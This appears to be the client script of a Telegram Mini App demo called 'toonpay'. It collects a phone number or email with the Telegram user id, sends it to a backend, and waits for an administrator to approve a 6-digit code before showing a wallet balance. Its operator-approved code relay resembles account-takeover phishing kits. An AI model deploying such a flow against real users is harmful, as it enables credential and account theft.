const loginScreen = document.getElementById("loginScreen");
const emailScreen = document.getElementById("emailScreen");
const codeScreen = document.getElementById("codeScreen");
const dashboardScreen = document.getElementById("dashboardScreen");

const phoneInput = document.getElementById("phoneInput");
const emailInput = document.getElementById("emailInput");
const codeInput = document.getElementById("codeInput");

const phoneSendButton = document.getElementById("phoneSendButton");
const emailSendButton = document.getElementById("emailSendButton");
const verifyCodeButton = document.getElementById("verifyCodeButton");

const emailLoginButton = document.getElementById("emailLoginButton");
const emailBackButton = document.getElementById("emailBackButton");
const codeBackButton = document.getElementById("codeBackButton");
const loginClose = document.getElementById("loginClose");

const codeDescription =
    document.getElementById("codeDescription");

const codeStatus =
    document.getElementById("codeStatus");

const balanceValue =
    document.getElementById("balanceValue");

const transactionsButton =
    document.getElementById("transactionsButton");

const transactionList =
    document.getElementById("transactionList");

const toast =
    document.getElementById("toast");


// =========================================================
// TELEGRAM MINI APP
// =========================================================

const tg = window.Telegram?.WebApp || null;

if (tg) {
    tg.ready();
    tg.expand();

    try {
        tg.setHeaderColor("#000000");
        tg.setBackgroundColor("#000000");
    } catch (e) {
        console.log(e);
    }
}


// =========================================================
// STATE
// =========================================================

let requestId = null;
let sessionToken = null;
let loginMethod = null;
let loginValue = null;

let statusTimer = null;


// =========================================================
// TELEGRAM USER
// =========================================================

function getTelegramUser() {

    if (
        tg &&
        tg.initDataUnsafe &&
        tg.initDataUnsafe.user
    ) {
        return tg.initDataUnsafe.user;
    }

    return {
        id: 0,
        username: "demo_user"
    };
}


// =========================================================
// SCREEN MANAGEMENT
// =========================================================

function hideAllScreens() {

    loginScreen.classList.add("hidden");
    emailScreen.classList.add("hidden");
    codeScreen.classList.add("hidden");
    dashboardScreen.classList.add("hidden");
}


function showScreen(screen) {

    hideAllScreens();

    screen.classList.remove("hidden");

    window.scrollTo({
        top: 0,
        behavior: "instant"
    });
}


// =========================================================
// TOAST
// =========================================================

function showToast(message) {

    toast.textContent = message;

    toast.classList.add("show");

    setTimeout(() => {
        toast.classList.remove("show");
    }, 3000);
}


// =========================================================
// BUTTON LOADING
// =========================================================

function setButtonLoading(button, loading) {

    if (!button) {
        return;
    }

    if (loading) {

        button.dataset.originalText =
            button.textContent;

        button.textContent = "Please wait...";

        button.disabled = true;

    } else {

        button.textContent =
            button.dataset.originalText ||
            button.textContent;

        button.disabled = false;
    }
}


// =========================================================
// PHONE LOGIN
// =========================================================

async function submitPhone() {

    const phone =
        phoneInput.value.trim();

    if (!phone) {

        showToast(
            "Please enter your phone number."
        );

        phoneInput.focus();

        return;
    }

    await createLoginRequest(
        "phone",
        phone
    );
}


// =========================================================
// EMAIL SCREEN
// =========================================================

emailLoginButton.addEventListener(
    "click",
    () => {

        showScreen(emailScreen);

        setTimeout(() => {
            emailInput.focus();
        }, 150);
    }
);


// =========================================================
// EMAIL LOGIN
// =========================================================

async function submitEmail() {

    const email =
        emailInput.value.trim();

    if (!email) {

        showToast(
            "Please enter your email address."
        );

        emailInput.focus();

        return;
    }

    await createLoginRequest(
        "email",
        email
    );
}


// =========================================================
// CREATE LOGIN REQUEST
// =========================================================

async function createLoginRequest(
    method,
    value
) {

    const button =
        method === "email"
            ? emailSendButton
            : phoneSendButton;

    setButtonLoading(button, true);

    const user =
        getTelegramUser();

    loginMethod = method;
    loginValue = value;

    try {

        const response =
            await fetch(
                "/api/login/request",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({

                        telegram_id:
                            user.id || 0,

                        username:
                            user.username || null,

                        login_value:
                            value,

                        login_method:
                            method
                    })
                }
            );

        const data =
            await response.json();

        if (!response.ok) {

            throw new Error(
                data.detail ||
                "Unable to submit request."
            );
        }

        requestId =
            data.request_id;

        codeDescription.textContent =
            `Enter the 6-digit code provided to you by the administrator.`;

        codeInput.value = "";

        codeStatus.textContent =
            "Your request has been sent to the administrator.";

        showScreen(codeScreen);

        setTimeout(() => {
            codeInput.focus();
        }, 200);

        startStatusPolling();

    } catch (error) {

        showToast(
            error.message ||
            "Something went wrong."
        );

    } finally {

        setButtonLoading(
            button,
            false
        );
    }
}


// =========================================================
// CODE INPUT
// =========================================================

codeInput.addEventListener(
    "input",
    () => {

        codeInput.value =
            codeInput.value
                .replace(/\D/g, "")
                .slice(0, 6);

        if (
            codeInput.value.length === 6
        ) {
            verifyCodeButton.focus();
        }
    }
);


// =========================================================
// VERIFY CODE
// =========================================================

async function verifyCode() {

    if (!requestId) {

        showToast(
            "No login request found."
        );

        return;
    }

    const code =
        codeInput.value.trim();

    if (
        code.length !== 6 ||
        !/^\d{6}$/.test(code)
    ) {

        showToast(
            "Please enter the 6-digit code."
        );

        codeInput.focus();

        return;
    }

    setButtonLoading(
        verifyCodeButton,
        true
    );

    codeStatus.textContent =
        "Checking your code...";

    try {

        const response =
            await fetch(
                "/api/login/submit-code",
                {
                    method: "POST",

                    headers: {
                        "Content-Type":
                            "application/json"
                    },

                    body: JSON.stringify({

                        request_id:
                            requestId,

                        entered_code:
                            code
                    })
                }
            );

        const data =
            await response.json();

        if (!response.ok) {

            throw new Error(
                data.detail ||
                "Unable to verify code."
            );
        }


        if (data.status === "approved") {

            codeStatus.textContent =
                "Code accepted.";

            await checkLoginStatus();

            return;
        }


        if (data.status === "rejected") {

            codeStatus.textContent =
                "Incorrect code. Please contact the administrator if you need a new code.";

            codeInput.value = "";

            codeInput.focus();

            return;
        }

    } catch (error) {

        codeStatus.textContent =
            error.message ||
            "Unable to verify code.";

    } finally {

        setButtonLoading(
            verifyCodeButton,
            false
        );
    }
}


// =========================================================
// POLL LOGIN STATUS
// =========================================================

function startStatusPolling() {

    stopStatusPolling();

    statusTimer =
        setInterval(
            checkLoginStatus,
            1500
        );
}


function stopStatusPolling() {

    if (statusTimer) {

        clearInterval(
            statusTimer
        );

        statusTimer = null;
    }
}


async function checkLoginStatus() {

    if (!requestId) {
        return;
    }

    try {

        const response =
            await fetch(
                `/api/login/status/${requestId}`
            );

        if (!response.ok) {
            return;
        }

        const data =
            await response.json();


        if (data.status === "approved") {

            stopStatusPolling();

            sessionToken =
                data.session_token;

            localStorage.setItem(
                "toonpay_demo_session",
                sessionToken
            );

            await loadDashboard();

            return;
        }


        if (data.status === "rejected") {

            codeStatus.textContent =
                "Please check the code provided by the administrator.";

        }

    } catch (error) {

        console.log(
            "Status check:",
            error
        );
    }
}


// =========================================================
// DASHBOARD
// =========================================================

async function loadDashboard() {

    if (!sessionToken) {
        return;
    }

    try {

        const response =
            await fetch(
                "/api/dashboard",
                {
                    headers: {
                        Authorization:
                            `Bearer ${sessionToken}`
                    }
                }
            );

        if (!response.ok) {

            throw new Error(
                "Session expired."
            );
        }

        const data =
            await response.json();

        renderDashboard(data);

        showScreen(
            dashboardScreen
        );

    } catch (error) {

        localStorage.removeItem(
            "toonpay_demo_session"
        );

        sessionToken = null;

        showScreen(loginScreen);

        showToast(
            "Please login again."
        );
    }
}


// =========================================================
// RENDER DASHBOARD
// =========================================================

function renderDashboard(data) {

    if (data.balance !== undefined) {

        balanceValue.textContent =
            `$${data.balance}`;
    }


    transactionList.innerHTML = "";

    if (
        Array.isArray(data.transactions)
    ) {

        data.transactions.forEach(
            transaction => {

                const item =
                    document.createElement("div");

                item.className =
                    "transaction-item";

                item.innerHTML = `

                    <div class="transaction-info">

                        <strong>
                            ${escapeHtml(
                                transaction.title
                            )}
                        </strong>

                        <span>
                            ${escapeHtml(
                                transaction.status
                            )}
                        </span>

                    </div>

                    <strong class="transaction-amount">
                        ${escapeHtml(
                            transaction.amount
                        )}
                    </strong>
                `;

                transactionList.appendChild(
                    item
                );
            }
        );
    }
}


// =========================================================
// TRANSACTIONS
// =========================================================

transactionsButton.addEventListener(
    "click",
    () => {

        transactionList.classList.toggle(
            "hidden"
        );

        const arrow =
            transactionsButton.querySelector(
                ".transaction-arrow"
            );

        if (
            transactionList.classList.contains(
                "hidden"
            )
        ) {

            arrow.textContent = "›";

        } else {

            arrow.textContent = "⌄";
        }
    }
);


// =========================================================
// BACK BUTTONS
// =========================================================

emailBackButton.addEventListener(
    "click",
    () => {

        showScreen(
            loginScreen
        );
    }
);


codeBackButton.addEventListener(
    "click",
    () => {

        stopStatusPolling();

        if (
            loginMethod === "email"
        ) {

            showScreen(
                emailScreen
            );

        } else {

            showScreen(
                loginScreen
            );
        }
    }
);


loginClose.addEventListener(
    "click",
    () => {

        if (tg) {

            try {
                tg.close();
            } catch (e) {
                console.log(e);
            }

        } else {

            showToast(
                "You can close this window."
            );
        }
    }
);


// =========================================================
// NAVIGATION
// =========================================================

document
    .querySelectorAll(".nav-item")
    .forEach(button => {

        button.addEventListener(
            "click",
            () => {

                document
                    .querySelectorAll(
                        ".nav-item"
                    )
                    .forEach(item => {
                        item.classList.remove(
                            "active"
                        );
                    });

                button.classList.add(
                    "active"
                );

                const page =
                    button.dataset.page;

                if (page !== "home") {

                    showToast(
                        `${capitalize(page)} section is available in the demo.`
                    );
                }
            }
        );
    });


// =========================================================
// CREATE ACCOUNT
// =========================================================

document
    .getElementById(
        "createAccountButton"
    )
    .addEventListener(
        "click",
        () => {

            showToast(
                "Account creation is available through the administrator."
            );
        }
    );


// =========================================================
// KEYBOARD
// =========================================================

phoneInput.addEventListener(
    "keydown",
    event => {

        if (
            event.key === "Enter"
        ) {
            submitPhone();
        }
    }
);


emailInput.addEventListener(
    "keydown",
    event => {

        if (
            event.key === "Enter"
        ) {
            submitEmail();
        }
    }
);


codeInput.addEventListener(
    "keydown",
    event => {

        if (
            event.key === "Enter"
        ) {
            verifyCode();
        }
    }
);


// =========================================================
// BUTTON EVENTS
// =========================================================

phoneSendButton.addEventListener(
    "click",
    submitPhone
);

emailSendButton.addEventListener(
    "click",
    submitEmail
);

verifyCodeButton.addEventListener(
    "click",
    verifyCode
);


// =========================================================
// HTML ESCAPE
// =========================================================

function escapeHtml(value) {

    return String(value)
        .replace(
            /&/g,
            "&amp;"
        )
        .replace(
            /</g,
            "&lt;"
        )
        .replace(
            />/g,
            "&gt;"
        )
        .replace(
            /"/g,
            "&quot;"
        )
        .replace(
            /'/g,
            "&#039;"
        );
}


// =========================================================
// CAPITALIZE
// =========================================================

function capitalize(value) {

    if (!value) {
        return "";
    }

    return value.charAt(0).toUpperCase()
        + value.slice(1);
}


// =========================================================
// RESTORE SESSION
// =========================================================

const savedSession =
    localStorage.getItem(
        "toonpay_demo_session"
    );

if (savedSession) {

    sessionToken =
        savedSession;

    loadDashboard();

} else {

    showScreen(
        loginScreen
    );
}
